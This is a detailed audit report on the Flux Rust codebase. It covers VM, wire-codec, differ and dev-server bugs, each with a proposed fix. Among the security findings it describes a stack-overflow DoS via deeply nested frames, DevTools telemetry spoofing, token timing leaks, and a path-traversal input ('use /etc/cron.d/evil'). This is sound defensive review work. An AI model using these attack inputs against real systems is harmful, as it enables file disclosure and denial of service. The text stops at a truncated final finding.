# Flux Codebase Deep-Dive Audit — Bugs, Performance & Code Smells

**Repository:** `https://github.com/elcoosp/flux` @ `3e5d913e` ("fix(ios): skip setChildren on non-structural reconcile…")
**Scope:** full monorepo — 16 Rust crates (~60k LOC), Kotlin + Swift native adapters (~7k LOC), stdlib (`.flux`), website (Astro/TS), VS Code extension, CI scripts.
**Method:** line-by-line manual review of every core crate (VM, wire codec, differ, dev server, parser, IR lowering, type checker hot paths) plus 4 parallel deep-review passes over codegen/parity, DevTools/LSP/perf, CLI/web/stdlib/scripts, and both native adapters. Every finding lists an exact `file:line` anchor and a concrete code fix.

---

## 1. Executive Summary

Flux is an ambitious and mostly *carefully engineered* codebase — the wire codec is OOM-hardened, the parser has explicit stack-depth guards, the differ precomputes parent indexes, and the audit culture is visible in comments (`Audit C7`, `Audit H15`, …). But the audit still surfaced **~175 real findings**, including several **CRITICAL** defects that break headline features:

| # | Sev | Area | One-line summary |
|---|-----|------|------------------|
| 1 | 🔴 CRIT | codegen | User components emit `Name(url: x)` named args in **Kotlin** — invalid syntax (`=` required); parity recognizer masks it |
| 2 | 🔴 CRIT | iOS adapter | `TextInput` **can never dispatch `onChangeText`** — no control event / delegate callback registered; the edit loop is dead on iOS |
| 3 | 🔴 CRIT | wire codec | `decode_value` recursion is **unbounded** → hostile WebSocket frame ⇒ stack overflow ⇒ whole dev server aborts |
| 4 | 🔴 CRIT | differ | `Insert` patches are sorted by `(parent, index)` only — a child can be inserted **before its new parent exists** (hash-ordered IDs make it a coin flip) |
| 5 | 🔴 CRIT | website | Fixture generator collapses arrays (`String([1]) === "1"`) → homepage trace player **crashes on Step ▶** (`ev.ids.forEach is not a function`) |
| 6 | 🔴 CRIT | website | i18n key-prefix mismatch renders **every trace-player label empty** in en/es/fr |
| 7 | 🟠 HIGH | VM | `NEG_I64` on `i64::MIN` **panics in debug builds** (`-v` not `wrapping_neg`) while every other op is `wrapping_*` |
| 8 | 🟠 HIGH | adapters | Font record read at **two different slot layouts** (iOS reads slot 1, canonical is slot 0) → every iOS `Text` silently renders size 14 |
| 9 | 🟠 HIGH | devserver | Dispatch deltas re-ship the **entire string table + all handler bytecode on every button tap** |
| 10 | 🟠 HIGH | devserver | DevTools endpoint **rebroadcasts any inbound "telemetry" from any client** (spoofing) while `DebugCommand` forwarding is dead code |

**Counts:** 🔴 Critical ×6 · 🟠 High ×~15 · 🟡 Medium ×~55 · 🔵 Low ×~50 · ⚪ Nit/smell ×~45.

**Cross-cutting themes** (detailed in §13):
1. **Generated-code validity is not guarded** — the Kotlin/Swift emitters produce non-compiling output for several primitives, and the parity recognizers are permissive enough (`:` *or* `=`, escape-blind tokenizer, `unwrap_or_default`) that CI stays green.
2. **Two-sources-of-truth drift** — `normalize_view_name`, `is_container`, `binop_symbol`, `canonicalize_expr`, `render_expr` and the prelude list are duplicated across `flux-codegen-core` and `flux-parity` with observable divergences.
3. **Escaping holes** — `startDestination` and animation curves are interpolated into generated code raw.
4. **Backend divergence** — `initialRouteName`, `onValueChange`, absent-prop semantics, handler rebind accumulation: same wire feature, different behavior per platform.
5. **Per-frame allocation churn in DevTools** — full-snapshot clones per table cell, O(n²) reconstructions, O(n) ring-buffer evictions.
6. **Fail-fast panics on the encode path** — `u16_len`/`expect` turn >64 KB legit payloads into dev-server crashes.

> Severity legend: 🔴 CRITICAL = breaks a headline feature or enables remote DoS/corruption · 🟠 HIGH = wrong behavior/panic/dead feature reachable in normal use · 🟡 MEDIUM = real bug or measurable perf/security issue in edge cases · 🔵 LOW = minor bug or smell · ⚪ NIT = polish.

---

## 2. Reference VM (`crates/flux-vm-ref`) — personal deep read

The VM is the behavioral oracle for the ISA (Appendix E); every bug here becomes a *normative* bug for iOS/Android runtimes.

### [🟠 HIGH] BUG — `NEG_I64` on `i64::MIN` panics in debug builds (inconsistent with the wrapping-arithmetic policy)
- File: `crates/flux-vm-ref/src/vm.rs` : 579-583
- Every other integer op uses `wrapping_add/sub/mul/div/rem` (lines 560-574), but negation is a plain `-v`. `NEG_I64` over `Int(i64::MIN)` — trivially reachable via `LOAD_INT_CONST` (`i64(1)` decodes 8 raw bytes) — is an arithmetic overflow: **panic in debug builds, silent wrap in release**. The oracle and the two host runtimes will disagree exactly when it matters (an edge the golden vectors don't pin), and a crafted handler crashes any debug-mode dev server task.
- Fix:
```rust
Opcode::NegI64 => {
    let dst = instr.u8(0);
    let v = expect_int(reg!(instr.u8(1)), instr.offset)?;
    regs[usize::from(dst)] = Value::Int(v.wrapping_neg()); // matches ADD/SUB/MUL policy
}
```
…plus an ISA vector pinning `NEG(i64::MIN) == i64::MIN` (two's-complement semantics) so Swift/Kotlin converge.

### [🟡 MEDIUM] BUG — `VmOutcome.signals` contains signals the handler never wrote
- File: `crates/flux-vm-ref/src/vm.rs` : 20-26 (doc), 880-887 & 949-955 (impl), 146-151 (`InMemorySignals::snapshot`)
- Doc: *"Final values of all signal cells that were written."* Implementation: `signals.snapshot()` returns **every entry in the store**, including pre-populated seeds from `InMemorySignals::from_signals(...)`. Any conformance harness that seeds signals (the normal case for golden vectors) sees those seeds echoed into the outcome — polluting parity comparisons and making "the handler wrote nothing" indistinguishable from "the handler rewrote everything."
- Fix: track writes as they happen (a `BTreeSet<SignalId>` updated in `exec_tail`'s `WriteSignal` and by `CapabilityImpl` wrappers), then:
```rust
fn finish(written: &BTreeSet<SignalId>, signals: &impl SignalStore, ...) -> Vec<(SignalId, Value)> {
    signals.snapshot().into_iter().filter(|(id, _)| written.contains(id)).collect()
}
```
(Alternatively document `snapshot()` as "whole-store" and rename the field.)

### [🟡 MEDIUM] PERF — `jump_target` is a linear scan ⇒ every loop iteration is O(program length)
- File: `crates/flux-vm-ref/src/vm.rs` : 1110-1130 (used by `Jump`/`CondJump`/`CondJumpNot`/`MatchTag`)
- `offsets.iter().position(|&o| o == target)` scans up to *n* offsets per taken jump. A loop body of 1 000 instructions executing 100 000 dispatches costs ~10⁸ comparisons — in the *reference* VM that hosts benchmarks (`benches/vm_eval_large.rs`) measure.
- Fix: build a map once per run and thread it into `exec_tail`:
```rust
let index_by_offset: HashMap<u32, usize> =
    program.iter().enumerate().map(|(i, instr)| (instr.offset, i)).collect();
// jump_target: offsets_index.get(&target).copied().ok_or_else(...)
```

### [🟡 MEDIUM] BUG — `finish` derives `gas_used` from a hard-coded `ENTRY_GAS` across resume chains
- File: `crates/flux-vm-ref/src/vm.rs` : 880-887, 406-435
- On `resume`, execution restarts with `gas = state.gas_remaining`, and `finish()` computes `ENTRY_GAS - gas`. The total happens to be arithmetically right for the single-suspend path, but any future resume chain that starts a segment from a *different* budget (or chains three suspends through different entry points) silently mis-reports. Make the accounting carried, not derived.
- Fix: store `gas_spent_so_far` in `SuspendState` and accumulate (`gas_used = spent + (segment_entry - gas)`), or return `gas_remaining` and let callers derive.

### [🔵 LOW] BUG — `AWAIT` truncates oversized cell ids instead of erroring
- File: `crates/flux-vm-ref/src/vm.rs` : 507-510
- `Value::Int(n) if n >= 0 => n as SignalId` — an `i64` payload above `u32::MAX` (from `LOAD_INT_CONST` or a capability) is silently truncated to the low 32 bits, awaiting a *different* cell.
- Fix:
```rust
Value::Int(n) if n >= 0 && n <= i64::from(u32::MAX) => n as u32,
_ => return Err(VmError::at(VmErrorKind::TypeMismatch, instr.offset)),
```

### [🔵 LOW] BUG — `exec_tail` treats an unresolvable start offset as "past end of program"
- File: `crates/flux-vm-ref/src/vm.rs` : 475-479
- `position(...).unwrap_or(program.len())` — a `SuspendState` whose `resume_ip` doesn't match any decoded instruction (crafted state, or an `AWAIT` as the final instruction) silently returns `Halt` with partial state instead of `InvalidDispatch`.
- Fix: `.ok_or_else(|| VmError::at(VmErrorKind::InvalidDispatch, start_offset))?`.

### [🔵 LOW] DESIGN — Synthetic string ids collide silently ⇒ false `STR_EQ` positives
- File: `crates/flux-vm-ref/src/vm.rs` : 1025-1032 (and `StrConcat` at 657-678)
- `TO_STRING`/`STR_CONCAT` map arbitrary text to `0x8000_0000 | fnv1a31(text)`. Equality of `Value::Str` **is id equality**, so two distinct rendered strings that collide (birthday bound ≈ 46 k strings) compare equal — the oracle would report `Bool(true)` where hosts with real tables (post `InternString`) would report `false`.
- Fix: keep a per-run `HashMap<String, StringId>` in the run context so synthetic ids are interned sequentially (`0x8000_0000 + n`) — deterministic *and* collision-free.

### [🔵 LOW] BUG — `resume` doc contradicts code on where the delivered value lands
- File: `crates/flux-vm-ref/src/vm.rs` : 366-370 vs 406
- Doc: *"with `value` in `r0`"*; code: `regs[state.result_reg] = value` (the `SuspendState` docs at lines 37-39 say the opposite of the function doc). Today `result_reg` is always 0 so behavior matches, but the docs invite a wrong host implementation.
- Fix: reword the `resume` doc to *"with `value` in `SuspendState::result_reg` (currently always r0)"*.

### [🔵 LOW] BUG — `InMemorySignals::allocate_cell` can collide with program-chosen ids
- File: `crates/flux-vm-ref/src/vm.rs` : 126-136, 152-157
- Allocation starts at a fixed 1 000 000; a handler that writes signal `1_000_001` (a legal `u32` id) races the allocator and hijacks the result cell. Reserve by policy *and* check:
```rust
fn allocate_cell(&mut self) -> SignalId {
    loop { self.next_cell += 1; if !self.values.contains_key(&self.next_cell) { return self.next_cell; } }
}
```

---

## 3. Wire codec (`crates/flux-ir-serde`) — personal deep read

The codec is the network-facing surface of the dev server (Appendix D). The OOM guards (`ensure_capacity`), the version fail-closed check, and the `Reader` bounds-checking are genuinely good — but doors are still open.

### [🔴 CRITICAL] SEC — `decode_value` recursion is unbounded ⇒ remote stack overflow aborts the whole dev server
- Files: `crates/flux-ir-serde/src/wire/value.rs` : 76-111 (recursion), reachable from `crates/flux-ir-serde/src/telemetry.rs` : 339-342 (per-register values in `VmStep` events), `crates/flux-ir-serde/src/resume.rs` : 156, and `Frame::from_init_bytes` state seed (`frame.rs` : 544-550)
- A hostile (or merely buggy) client on `:7331` can send one ~200 KB `Telemetry` frame containing a 65 535-deep nested `List` (3 bytes per level: tag + u16 count). `decode_value` recurses once per level; Rust stack overflow is **not a catchable panic** — the process dies (`SIGSEGV`/abort), taking the patch channel, asset server and DevTools with it. The fuzz targets (`fuzz/fuzz_targets/decode_value_blob.rs`) won't hit this because default `libFuzzer -max_len` keeps inputs far below the needed depth.
- Fix (depth-limited decode, matching the parser's `MAX_PARSE_DEPTH` policy):
```rust
const MAX_VALUE_DEPTH: usize = 128;

pub(crate) fn decode_value(r: &mut Reader<'_>) -> Result<Value, WireError> {
    decode_value_d(r, 0)
}

fn decode_value_d(r: &mut Reader<'_>, depth: usize) -> Result<Value, WireError> {
    if depth > MAX_VALUE_DEPTH {
        return Err(WireError::InvalidTag { tag: 0, context: "value.depth", at: r.pos() });
    }
    let tag = r.u8("value.tag")?;
    match tag {
        TAG_LIST => {
            let count = r.u16("value.list.count")?;
            r.ensure_capacity(count as usize, "value.list")?;
            let mut items = Vec::with_capacity(count as usize);
            for _ in 0..count { items.push(decode_value_d(r, depth + 1)?); }
            Ok(Value::List(items))
        }
        TAG_RECORD => { /* same: decode_value_d(r, depth + 1) */ }
        // ... unchanged
    }
}
```
Mirror the ceiling on the encode side and in the Swift/Kotlin decoders so all three hosts fail closed identically.

### [🟡 MEDIUM] SEC — `decode_closures` handler-count guard allows ~100× transient memory amplification
- File: `crates/flux-ir-serde/src/frame.rs` : 637-650
- The guard `handler_count > blob.len().saturating_add(1)` permits `Vec::with_capacity(handler_count)` where each `ClosureIR` (~120 B with `Vec`s, span, excerpt `String`) is later filled from ≥ ~30 wire bytes. A 1 MB frame (under `MAX_FRAME_BYTES`) forces a ~100 MB transient allocation per frame before the stream errors out; repeated frames are a cheap memory-pressure DoS.
- Fix: bound by the *minimum encoding size* of one `HandlerDef`, not by the blob length:
```rust
const MIN_HANDLER_DEF_BYTES: usize = 4 + 4 + 4 + 2 + 2 + 12 + 2; // id,hash,off,len,caps,span,excerpt-len
if handler_count > blob.len() / MIN_HANDLER_DEF_BYTES + 1 {
    return Err(WireError::MalformedBytecode { /* ... */ });
}
```

### [🟡 MEDIUM] BUG — `write_closures` panics on >64 KB handler bytecode and silently mis-slices duplicate ids
- File: `crates/flux-ir-serde/src/frame.rs` : 165-201
- Two defects in the *encode* path (runs in the dev server on every hot reload):
  1. `u16::try_from(closure.bytecode.len()).expect("bytecode len exceeds u16 (audit H14)")` — a handler whose compiled body exceeds 65 535 bytes **panics the pipeline thread** instead of producing a diagnostic.
  2. `offsets.iter().find(|(id, _, _)| *id == closure.id)` is O(n²) *and* returns the **first** entry for a duplicate id — two closures sharing an id emit the first one's offset for both, shipping the wrong bytecode with no error.
- Fix:
```rust
fn write_closures(w: &mut Writer, closures: &[ClosureIR]) -> Result<(), EncodeError> {
    if closures.is_empty() { encode_bytecode_blob(w, &[]); return Ok(()); }
    let mut blob = Vec::new();
    let mut by_id: HashMap<HandlerId, (u32, u16)> = HashMap::with_capacity(closures.len());
    for c in closures {
        let offset = u32::try_from(blob.len()).map_err(|_| EncodeError::BlobTooLarge)?;
        let len = u16::try_from(c.bytecode.len()).map_err(|_| EncodeError::ClosureTooLarge(c.id))?;
        if by_id.insert(c.id, (offset, len)).is_some() {
            return Err(EncodeError::DuplicateHandlerId(c.id)); // fail loud, not wrong bytes
        }
        blob.extend_from_slice(&c.bytecode);
    }
    // ... stream HandlerDefs using by_id (O(1) lookup)
}
```

### [🟡 MEDIUM] BUG — Encode-side `u16_len` panics turn oversized-but-legit payloads into dev-server crashes
- Files: `crates/flux-ir-serde/src/wire/cursor.rs` : 36-41; `wire/value.rs` : 23, 29; `frame.rs` : 704, 709, 731, 885-887
- `u16_len` panics by design ("panic the encode instead", audit H14). But the inputs are attacker-*uninteresting* and user-*plausible*: a `List` prop with 70 000 items, a record with >65 535 fields, >65 535 `state_seed` entries or component names. A panic inside the compile/serialize task kills the hot-reload frame for data the user authored in good faith.
- Fix: make the frame encoders fallible (`fn encode_into(&self, buf: &mut Vec<u8>) -> Result<(), EncodeError>`) and surface `EncodeError::LengthExceedsU16 { what, n }` as an `Error` frame diagnostic, or bump those length prefixes to `u32` in the next protocol version.

### [🔵 LOW] BUG — `InternStringFrame` doc lies about units and `intern_into` interns "" for garbage
- File: `crates/flux-ir-serde/src/frame.rs` : 1105 ("in UTF-8 code units" — it is **bytes**), 1174-1185
- `intern_into` silently interns the empty string for a non-UTF-8 payload and returns a valid id — the host believes its bytes mapped to that id while every lookup resolves to `""`. The dev server path (`session.rs` : 374-380) drops the frame instead, so the fail-open branch is currently dead — delete it or make it return `Option`:
```rust
pub fn intern_into(&self, table: &mut StringTable) -> Option<StringInternedFrame> {
    let valid = self.as_str()?;              // protocol violation -> no reply
    Some(StringInternedFrame::new(table.intern(valid)))
}
```

### [🔵 LOW] SMELL — `from_hello_bytes` / `from_heartbeat_bytes` collapse every failure into `None`
- File: `crates/flux-ir-serde/src/frame.rs` : 371-421, 1062-1072
- Callers cannot distinguish "not a Hello" from "truncated Hello" from "bad version". Return `Result<T, WireError>` so the server can log *which* field failed. Also: a trailing token whose length prefix is present but body truncated decodes as "no token presented" (`frame.rs` : 405-412) — fail closed by treating a malformed token as a handshake failure when a token policy is configured.

### [🔵 LOW] NIT — Parity reference decoder triple-decodes and rejects valid frame kinds
- File: `crates/flux-parity/src/error_frame.rs` : 82-96
- `ReferenceDecoder::decode` tries `from_error_bytes` twice plus `from_hello_bytes`, and rejects valid `Delta`/`Heartbeat`/`Init` frames outright — the parity corpus is silently narrower than both real decoders. Decode once via kind dispatch and extend `default_corpus` with one valid frame of every kind.

---

## 4. Differ (`crates/flux-differ`) — personal deep read

### [🔴 CRITICAL] BUG — `Insert` patches are not topologically ordered: children can target a parent that does not exist yet
- Files: `crates/flux-differ/src/diff/algorithm.rs` : 125-154; `crates/flux-differ/src/diff/tree.rs` : 112-114
- Audit C8 sorted inserts by `(parent, index)` — that fixes **sibling** ordering within one parent, but node ids are *content-derived hashes* (`flux-syntax/src/ids/fnv.rs`), so the sort gives **no ancestry guarantee across parents**. Concretely: an edit that adds `Column { … Row { Text() } }` where `Row` is new emits `Insert(parent=Column, node=Row)` and `Insert(parent=Row, index 0, node=Text)`. Their sort keys are `(Column_id, i)` and `(Row_id, 0)` — whether `Row_id > Column_id` is a property of the hash, i.e. a **coin flip per edit**. When the child sorts first, the host receives an insert addressed to a node it has never seen (the wire `NodeRef` carries only child *ids*, `emit.rs` : 55-63) and the patch stream breaks — a blank subtree or a dropped reconcile depending on host error handling. The same applies to the synthetic multi-root wrapper id, itself just `compute_node_id(0, Component, Span(0,0,0), None)` (`pipeline/tree.rs` : 63-72).
- Fix (deterministic ancestry-first ordering; replaces the flat sort):
```rust
// Group inserted ids by "patch depth": how many of its ancestors are also new.
// Emit shallower levels first; within a level keep the C8 (parent, index) order.
fn insert_order(new_index: &ParentIndex, inserted: &[NodeId]) -> Vec<NodeId> {
    let new_set: AHashSet<NodeId> = inserted.iter().copied().collect();
    let mut keyed: Vec<(u32, NodeId, u16, NodeId)> = inserted.iter().map(|id| {
        let mut depth = 0u32;
        let mut parent = new_index.get(id).map(|p| p.0);
        while let Some(p) = parent {
            if !new_set.contains(&p) { break; }
            depth += 1;
            parent = new_index.get(&p).map(|pp| pp.0);
        }
        let (parent, idx) = new_index.get(id).copied()
            .unwrap_or((synthetic_root_id(), 0));
        (depth, parent, idx, *id)
    }).collect();
    keyed.sort_by_key(|(depth, parent, idx, _)| (*depth, *parent, *idx));
    keyed.into_iter().map(|(_, _, _, id)| id).collect()
}
```
Add a golden test with a 3-deep new subtree whose ids sort adversarially (brute-force spans to find one, as `lower/mod.rs` : 1050 does for prop collisions).

### [🟡 MEDIUM] PERF — `is_root_of_new` / `root_position` are O(n²) nested full-arena scans
- File: `crates/flux-differ/src/diff/tree.rs` : 101-130
- Each call re-walks *all* ids × all children; `root_position` calls the predicate once per root. On a 10 k-node tree with a few new roots this is ~10⁸ child visits per hot reload.
- Fix: compute the referenced-id set once and reuse:
```rust
fn referenced_ids(arena: &IRArena) -> AHashSet<NodeId> {
    arena.all_ids().filter_map(|id| arena.get(id))
        .flat_map(|v| v.children().iter().flat_map(Child::node_ids)).collect()
}
pub(crate) fn is_root_of_new(_new: &IRArena, id: &NodeId, refs: &AHashSet<NodeId>) -> bool {
    !refs.contains(id)
}
```

### [🔵 LOW] PERF — paired-id membership via `pairs.iter().any(...)` in two loops
- File: `crates/flux-differ/src/diff/algorithm.rs` : 118-134
- O(|removed|·|pairs| + |inserted|·|pairs|). Hoist into `let paired_old: AHashSet<_> = pairs.iter().map(|(o, _)| *o).collect();` (and `paired_new`) for O(1) tests.

### [🔵 LOW] SMELL — `Patch::Update` always ships the *full* prop map under a name that promises a diff
- Files: `crates/flux-differ/src/diff/emit.rs`; `crates/flux-devserver/src/dispatch.rs` : 243-255
- `removals` is always empty and `changes` is the whole map — fine for the node-count budget, but the type name invites misuse (a host that applies only `changes` as a diff leaves stale props forever). Rename to `PropSnapshot` or populate removals from the old arena.

---

## 5. IR & lowering (`crates/flux-ir`, `crates/flux-syntax`) — personal deep read

### [🟠 HIGH] DESIGN/BUG — `prop_index_for_name` is a 16-bit FNV truncation while its docs promise distinct indices
- File: `crates/flux-ir/src/lower/mod.rs` : 1028-1041; relied on by the VM's record ops (`vm.rs` : 1132-1174), the wire record layout (Appendix C), and release codegen's router lookup (`codegen-core/src/emitter.rs` : 671-678)
- *"Two props with distinct names get distinct indices"* is mathematically false: the space is 2¹⁶ and FNV-1a is not injective — the crate's own test (`lower/mod.rs` : 1047-1057) **brute-forces collisions**. Two props on the same record whose names collide alias the same `PropIdx`: `SET_FIELD` overwrites the other field, `GET_FIELD` returns the wrong value — silent data corruption that depends on the prop *names* a user picks. With ~20 props/component, per-component collision odds are ≈ 3 %; across an app, near-certain somewhere.
- Fix (keep wire compatibility, kill the aliasing):
  1. Assign `PropIdx` from a **per-program intern table** at lowering time (dense u16, deterministic order) and ship the name→idx map once in the Init frame metadata.
  2. Short term, fail loud at lower time when two distinct names hash to the same slot:
```rust
pub struct Lowerer { prop_indices: HashMap<String, PropIdx> }
fn prop_index(&mut self, name: &str) -> Result<PropIdx, LoweringError> {
    if let Some(idx) = self.prop_indices.get(name) { return Ok(*idx); }
    let idx = prop_index_for_name(name);
    self.prop_indices.insert(name.to_owned(), idx);
    Ok(idx)
}
// + a compile-time check: two names, same slot, different name -> LoweringError
```

### [🔵 LOW] BUG — Router start-destination lookup trusts the same 16-bit hash
- Files: `crates/flux-codegen-core/src/emitter.rs` : 671-678 reading `initialRouteName`
- A sibling prop whose name collides with `initialRouteName`'s digest changes the compiled router's start destination. Fix lands automatically with the registry above.

### [🔵 LOW] SMELL — `flux-cli/src/fmt.rs` derives "stable" node ids from `DefaultHasher`
- File: `crates/flux-cli/src/fmt.rs` : 67-75
- Doc promises reproducibility across runs; `DefaultHasher::new()` is only stable *per release* (no guarantee tomorrow). A toolchain bump silently rewrites every id the formatter emits. Use the workspace-standard `fnv1a32` (`flux-syntax/src/ids/fnv.rs`).

---

## 6. Dev server (`crates/flux-devserver`) — personal deep read

Session handling, the file watcher, the pipeline, the async bridge, the asset server and the debug bridge.

### [🟠 HIGH] SEC/BUG — DevTools endpoint rebroadcasts any inbound "telemetry" from any client, and `DebugCommand` forwarding is dead
- File: `crates/flux-devserver/src/debug_bridge.rs` : 341-361 (inbound loop), 206-210 (`route_command`, **zero callers**), `server.rs` : 154-160 (drain task discards commands)
- The module doc promises *"`DebugCommand` frames from DevTools are forwarded back to the host"*. The code does the **exact inverse of the trust model**:
  - The inbound loop accepts `TelemetryFrame`s from any connected DevTools socket and calls `route_telemetry(&event)` — i.e. it re-broadcasts them, source-enriched, to **every other DevTools client as if the host had emitted them**. Any client that can reach `:7333` (unauthenticated by default — `token` is `Some` only when `--token` was passed, `config.rs` : 43) can inject fake VM steps, view mutations and perf records into someone else's DevTools session.
  - Meanwhile actual `DebugCommand`s from DevTools are **dropped** (`TelemetryFrame::from_bytes` fails on them), and even a successfully routed command would land in `host_command_tx`, which the `devtools_drain` task receives and throws away (`server.rs` : 155-158: "observed but not forwarded").
- Fix:
```rust
// inbound loop: commands only; never re-broadcast telemetry from a DevTools socket
while let Some(msg) = reader.next().await {
    let Ok(msg) = msg else { continue };
    let bytes = match &msg { Message::Binary(b) => b, _ => continue };
    match DebugCommandFrame::from_bytes(bytes) {          // decode commands, not telemetry
        Some(cmd) => { router_in.lock().route_command(cmd); } // which forwards to host_command_tx
        None => tracing::debug!("devtools: non-command frame dropped"),
    }
}
// and in DevServer::start, actually forward host_command_rx to the live host session
// instead of draining it.
```
Tag events by connection *role* (host vs devtools) if telemetry ever needs to enter here, and add a regression test asserting a DevTools-injected telemetry frame reaches nobody.

### [🟠 HIGH] BUG — `AsyncBridge` session cleanup keeps `parked` forever ⇒ leak + cross-session resume corruption
- Files: `crates/flux-devserver/src/server/session.rs` : 107-109; `crates/flux-devserver/src/async_bridge.rs` : 124-128
- At session end the server calls `clear_early()`, whose comment says it prevents stale state from leaking into "a future session that reuses the cell-id space". But **`parked` is never cleared**. Consequences:
  1. *Unbounded growth*: every handler that suspends and never settles (host died mid-await, capability never resolved) leaves an entry for the process lifetime.
  2. *Cross-session corruption*: cell ids restart from ~1 000 000 in the new host session, so a **new** dispatch report settling cell `N` matches the **old** session's `Parked { handler_id, resume_ip }` and emits a `Resume` frame addressing the *old* handler to the *new* session — the host resumes the wrong continuation with the wrong value.
- Fix:
```rust
/// Clears all session-scoped state (`early` AND `parked`) at session end.
pub fn clear_session(&mut self) {
    self.early.clear();
    self.parked.clear();
}
// session.rs: shared.async_bridge.lock().clear_session();
```
(Also consider keying `parked` by `(session_generation, cell)` as defense in depth.)

### [🟡 MEDIUM] SEC — Pairing-token comparison is not constant-time
- File: `crates/flux-devserver/src/server/session.rs` : 220-240 (`presented == expected`)
- String equality short-circuits on the first differing byte; over a LAN (`--ws-host 0.0.0.0` is the documented use) an attacker can statistically recover the token prefix byte-by-byte via timing. The token exists precisely to protect that LAN exposure, so compare it in constant time:
```rust
use subtle::ConstantTimeEq; // add `subtle = "2"` to workspace deps
let ok = presented.as_bytes().ct_eq(expected.as_bytes()).into();
match ok { true => {} _ => { /* reject */ } }
```
(or hash both sides with blake3 and compare the digests — same effect, no new dep).

### [🟡 MEDIUM] SEC — Module loader resolves `use` names with `Path::join` — absolute paths escape the project root
- File: `crates/flux-devserver/src/pipeline.rs` : 709-722
- `root.join(format!("{name}.flux"))`: a `use /etc/cron.d/evil` statement makes `join` **replace** the base with the absolute path (standard `Path::join` semantics), and `use ../../secrets/main` walks out of the root. The file contents then flow into type checking and can surface in diagnostics/excerpts — an arbitrary-read-with-suffix primitive driven by any compiled source (e.g. a cloned example project).
- Fix: validate the module name as a plain identifier before touching the filesystem:
```rust
fn valid_module_name(name: &str) -> bool {
    !name.is_empty()
        && name.split('/').all(|seg| !seg.is_empty() && seg.chars().all(|c| c.is_ascii_alphanumeric() || c == '_'))
}
Arc::new(move |name: &str| {
    if !valid_module_name(name) { return None; }
    // ... existing joins
})
```

### [🟡 MEDIUM] PERF — Every dispatch delta re-ships the full string table and every closure
- File: `crates/flux-devserver/src/pipeline.rs` : 455-482 (`build_dispatch_delta`)
- A single button tap produces a `Delta` whose `FLAG_HAS_STRING_DELTA` payload is the **entire arena string table** plus **all handler closures** (`last.closures.values().cloned()`), regardless of the 2–3 `Update` patches it carries. The ADR-0027 promise is `|dependents[S]|`-bounded patches; the frame is actually O(whole program) per dispatch — bandwidth, host decode time and per-tap allocations all scale with app size, undermining the "milliseconds hot loop" for real projects.
- Fix (incremental, minimal):
```rust
// 1) collect string ids actually referenced by the patches
fn referenced_strings(patches: &[Patch], arena: &IRArena) -> Vec<(StringId, String)> { /* walk prop values */ }
// 2) closures: only those whose ids appear in the patches (dispatch deltas never
//    introduce handlers) -> ship NONE for dispatch frames
Frame::delta(self.seq, FLAG_HAS_STRING_DELTA, patches, &referenced, &[], &[])
```
Longer term: stop reassigning string ids per compile (intern content-addressed ids once — the infrastructure already exists in `host_strings`) and the full-table re-ship becomes unnecessary for edit deltas too (`build_delta`, : 797-827, same issue on every keystroke).

### [🟡 MEDIUM] PERF — The "allocation-free" scratch buffer is defeated by a full clone on every frame
- File: `crates/flux-devserver/src/pipeline.rs` : 789-793 (Init), 823-826 (Delta)
- `frame.encode_into(&mut self.scratch); self.scratch.clone()` — the encode reuses capacity, then the result is **deep-copied anyway** for broadcast, so every Init/Delta still allocates a full frame-sized buffer. The OPT-B optimization pays the complexity but not the benefit.
- Fix: `let bytes = std::mem::take(&mut self.scratch); ... broadcast(bytes); self.scratch = Vec::with_capacity(cap);` — or better, make broadcast accept `Arc<Vec<u8>>` (tokio broadcast requires `Clone`, and `Arc` clone is the cheap one; multiple clients then share one allocation).

### [🟡 MEDIUM] BUG — Watch loop recompiles on read-only file access and double-compiles every save burst
- File: `crates/flux-devserver/src/watch.rs` : 90-114, 193-199
- 1. `is_source_change` accepts **every** `EventKind::Modify(_)` — including `Modify::Access` (open/close), which inotify emits on Linux whenever *anything reads* the file (an editor writing a temp file, `ls -la`, an LSP poll). A read-only access triggers `reload` + full recompile + broadcast.
  2. The coalesce window runs **after** `compile_and_broadcast` (`watch.rs` : 112-113): events landing inside the sleep are processed in a *second* pass 50 ms later — the comment ("a second save landing inside it is picked up by the same compile pass") is not what the code does. Every save burst costs at least two full pipeline runs.
- Fix:
```rust
fn is_source_change(event: &Event) -> bool {
    use notify::event::{DataChange, ModifyKind};
    matches!(event.kind,
        EventKind::Create(_)
        | EventKind::Remove(_)
        | EventKind::Modify(ModifyKind::Data(_) | ModifyKind::Metadata(_) /* rename too */))
}
// watch_loop: sleep(coalesce) FIRST, then drain pending (it will contain the burst),
// then compile once:
std::thread::sleep(timing.coalesce);
reload(&mut pending, shared);
compile_and_broadcast(shared);
```

### [🟡 MEDIUM] PERF — `root_ids` is O(n²) on every Init
- File: `crates/flux-devserver/src/pipeline/tree.rs` : 76-87
- `referenced.contains(id)` is a linear scan over a `Vec` inside a filter over all ids — for a 10 k-node tree that's ~10⁸ comparisons on every (re)connect and every error→fixed transition.
- Fix: `let referenced: AHashSet<NodeId> = ...collect();` then `filter(|id| !referenced.contains(id))` — O(n).

### [🔵 LOW] BUG — No idle timeout or connection cap after handshake (both listeners)
- Files: `crates/flux-devserver/src/server/session.rs` : 83-106; `debug_bridge.rs` : 232-262
- The 10 s deadline covers only the Hello phase. Post-handshake, a silent peer holds its task forever; neither listener caps concurrent connections. Each task is cheap, but N idle sockets + one `Arc<Shared>` per peer is a trivially scriptable resource tax on a LAN-exposed server.
- Fix: wrap the main loop in `tokio::time::timeout(IDLE_TIMEOUT, ...)` resetting on any frame (heartbeat qualifies), and gate `tokio::spawn` behind a `Semaphore::MAX_CONNECTIONS` (e.g. 64).

### [🔵 LOW] SEC — `serve_devtools` token check is substring-based and lands in URLs/logs
- File: `crates/flux-devserver/src/debug_bridge.rs` : 248-261
- `query.contains(&format!("token={expected}"))` is unanchored (`?notatoken=…` also matches a query *containing* the expected string as a substring of another param) and — more importantly — secrets in query strings end up in proxy/server logs. Prefer a fixed header (`Authorization: Bearer …`) or anchor the parse: split the query on `&`, compare `k == "token"` with constant-time `v` compare (see §6.3).

### [🔵 LOW] SMELL — Host telemetry accepted from any post-handshake client on `:7331` (no role separation)
- File: `crates/flux-devserver/src/server/session.rs` : 120-157
- Any connected socket may dispatch telemetry, dispatch reports and await-suspends — by design today (the Simulator only forwards one port), but it means a *DevTools* client on the patch channel is also a *host* as far as the server cares. Document the trust model at the top of `session.rs` and (when the simulator limitation is lifted) split the frame-type allowlist per handshake-declared role.

### [🔵 LOW] BUG — `unknown_frame` spawns blocking-pool work per garbage frame
- File: `crates/flux-devserver/src/server/session.rs` : 163-176
